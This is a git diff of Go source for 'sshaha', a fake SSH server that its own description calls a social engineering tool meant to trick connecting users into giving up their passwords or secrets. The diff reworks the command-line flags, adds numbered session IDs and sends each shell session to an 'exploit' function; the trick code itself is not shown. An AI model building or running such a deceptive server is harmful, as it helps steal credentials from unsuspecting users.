@@ -11,26 +11,30 @@ import (
 	"net"
 	"os"
 	"reflect"
+	"strconv"
 
 	"github.com/kr/pty"
 	"github.com/spf13/cobra"
-	"github.com/spf13/viper"
 	"golang.org/x/crypto/ssh"
 )
 
 var (
-	sessionID = 1
+	sessionID = 0
 )
 
 func init() {
-	rootCmd.PersistentFlags().StringP("victimOS", "v", "ubuntu", "The operating system of the connecting victim")
-	rootCmd.PersistentFlags().StringP("serverOS", "s", "ubuntu", "What operating system this sshaha will pretend to be")
-	rootCmd.PersistentFlags().StringP("victimHostname", "o", "localhost", "The hostname of the victims machine")
-	rootCmd.PersistentFlags().StringArrayP("tricks", "t", []string{"all"}, "The tricks that the server will run on the victim")
-	viper.BindPFlag("victimOS", rootCmd.PersistentFlags().Lookup("victimOS"))
-	viper.BindPFlag("serverOS", rootCmd.PersistentFlags().Lookup("serverOS"))
-	viper.BindPFlag("victimHostname", rootCmd.PersistentFlags().Lookup("victimHostname"))
-	viper.BindPFlag("tricks", rootCmd.PersistentFlags().Lookup("tricks"))
+	// rootCmd.PersistentFlags().StringP("victimOS", "v", "ubuntu", "The operating system of the connecting victim")
+	// viper.BindPFlag("victimOS", rootCmd.PersistentFlags().Lookup("victimOS"))
+
+	// rootCmd.PersistentFlags().StringP("serverOS", "s", "ubuntu", "What operating system this sshaha will pretend to be")
+	// viper.BindPFlag("serverOS", rootCmd.PersistentFlags().Lookup("serverOS"))
+
+	// rootCmd.PersistentFlags().StringP("victimHostname", "o", "localhost", "The hostname of the victims machine")
+	// viper.BindPFlag("victimHostname", rootCmd.PersistentFlags().Lookup("victimHostname"))
+
+	// rootCmd.PersistentFlags().StringArrayP("tricks", "t", []string{"all"}, "The tricks that the server will run on the victim")
+	// viper.BindPFlag("tricks", rootCmd.PersistentFlags().Lookup("tricks"))
+
 }
 
 // Execute run things
@@ -44,7 +48,7 @@ func Execute() {
 var rootCmd = &cobra.Command{
 	Use:   "sshaha <ip> <port>",
 	Short: "ssh social engineering tool",
-	Long:  `sshaha is designed to trick unwary users that connect to it into giving up their passwords`,
+	Long:  `sshaha is designed to trick unwary users that connect to it into giving up their secrets`,
 	Args:  cobra.ExactArgs(2),
 	Run: func(cmd *cobra.Command, args []string) {
 		ip := args[0]
@@ -75,6 +79,7 @@ var rootCmd = &cobra.Command{
 		if err != nil {
 			log.Fatal("failed to listen for connection: ", err)
 		}
+		log.Println("SSHaha started, now listening for connections")
 		listenForConnections(listener, config)
 	},
 }
@@ -161,10 +166,13 @@ func handleEnv(req *ssh.Request) bool {
 }
 
 func handleShell(channel ssh.Channel, connDetails map[string]string) bool {
-	log.Printf("shell session started")
 	sessionID = sessionID + 1
-	corruptedLoginTrick(channel, connDetails)
-	//passwordIncorrectTrick(channel, connDetails)
+	connDetails["sessionID"] = strconv.Itoa(sessionID)
+
+	log.Printf("shell session %s started ", connDetails["sessionID"])
+	exploit(channel, connDetails)
+	// corruptedLoginTrick(channel, connDetails)
+	// passwordIncorrectTrick(channel, connDetails)
 	return true
 }
 
